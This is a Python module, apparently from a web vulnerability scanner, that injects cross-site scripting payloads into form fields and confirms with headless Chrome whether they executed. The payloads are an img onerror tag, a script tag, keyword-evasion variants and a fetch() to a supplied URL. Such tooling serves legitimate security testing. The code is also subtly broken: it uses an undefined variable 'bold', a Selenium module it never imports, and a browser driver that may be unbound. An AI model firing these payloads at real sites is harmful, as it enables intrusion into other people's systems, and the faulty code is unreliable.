import hashlib, selenium, selenium.webdriver, selenium.webdriver.support.expected_conditions, time, typing

import utils

'''
Gives information about a vulnerable form field
'''
class XSSVuln():
    def __init__(self, form: utils.Form, field: str, src: str, stype: str) -> None:
        self._form = form
        self._field = field
        self._src = src
        self._type = stype
    
    @property
    def form(self) -> utils.Form:
        return self._form
    
    def json(self) -> typing.Dict[str, str]:
        return {
            'field' : self._field,
            'src' : self._src,
            'type' : self._type
        }

    def __repr__(self) -> str:
        return f'\x1B[91mVulnerability detected!\x1B[0m\nOn field {self._field} in {self._form} with script {self._src}\n{self._type}'

'''
Generates a number of HTML elements which can deliver a script
'''
def script_injections(script: str) -> typing.List[str]:
    candidates = []

    image = f'<img src=\'fake_url\' onerror=\'{script}\' />'
    script = f'<script>{script}</script>'

    candidates += [image, bold, script]
    candidates += utils.bl_avoid(image, ['img', 'src', 'onerror', 'http', 'fetch'])
    candidates += utils.bl_avoid(script, ['script', 'http', 'fetch'])

    for i in range(len(candidates)):
        candidates[i] = candidates[i].replace('@@index@@', str(i))

    return candidates

'''
Generate an ID-friendly unique ID
'''
def generate_id(form: str, field: str, timestamp: int, index: str) -> str:
    md5 = hashlib.md5()
    md5.update(form.encode('utf-8', 'ignore'))
    md5.update(field.encode('utf-8', 'ignore'))
    return f'vmap.{timestamp}.{md5.hexdigest()}.{index}'

'''
Tests a list of forms for JS injection vulnerabilities
'''
def test_scripts(targets: typing.List[utils.Form], limits: int, delay: typing.Optional[int]) -> typing.List[XSSVuln]:
    results = []

    driver_opts = selenium.webdriver.ChromeOptions()
    driver_opts.add_argument('headless')

    timestamp = int(time.time())

    for form in targets:
        for field in form.get_fields():
            gid = generate_id(form.name, field, timestamp, '@@index@@')
            injections = script_injections(f'document.body.innerHTML+="<br id=\\"{gid}\\" />";')
            for i in range(len(injections)):
                url, err = form.soupless_request({x : (injections[i] if x == field else '') for x in form.get_fields()})

                if err is not None:
                    continue

                driver = selenium.webdriver.Chrome(chrome_options=driver_opts)
                driver.get(url)
                try:
                    c = (selenium.webdriver.common.by.By.ID, generate_id(form.name, field, timestamp, str(i)))
                    selenium.webdriver.support.ui.WebDriverWait(driver, limits).until(selenium.webdriver.support.expected_conditions.presence_of_element_located(c))
                    results.append(XSSVuln(form, field, injections[i], 'JS Injection'))
                except selenium.common.exceptions.TimeoutException:
                    pass
                driver.close()
                
                if delay is not None:
                    time.sleep(delay)
    
    driver.quit()
    return results

'''
Tests a list of forms for XSS vulnerabilities
'''
def test_xss(targets: typing.List[utils.Form], limits: int, delay: typing.Optional[int], flag_url: str, flag_text: str) -> typing.List[XSSVuln]:
    results = []

    driver_opts = selenium.webdriver.ChromeOptions()
    driver_opts.add_argument('headless')

    timestamp = str(time.time())

    for form in targets:
        for field in form.get_fields():
            gid = generate_id(form.name, field, timestamp, '@@index@@')
            injections = script_injections(f'fetch("{flag_url}").then(res => res.text()).then(text => document.body.innerHTML+="<span id=\\"{gid}\\">"+text+"</span>");')
            for i in range(len(injections)):
                url, err = form.soupless_request({x : (injections[i] if x == field else '') for x in form.get_fields()})

                if err is not None:
                    continue

                driver = selenium.webdriver.Chrome(chrome_options=driver_opts)
                driver.get(url)
                try:
                    c = (selenium.webdriver.common.by.By.ID, generate_id(form.name, field, timestamp, str(i)))
                    selenium.webdriver.support.ui.WebDriverWait(driver, limits).until(selenium.webdriver.support.expected_conditions.presence_of_element_located(c))
                    results.append(XSSVuln(form, field, injections[i], 'JS Injection'))
                except selenium.common.exceptions.TimeoutException:
                    pass
                driver.close()
                
                if delay is not None:
                    time.sleep(delay)
    
    driver.quit()
    return results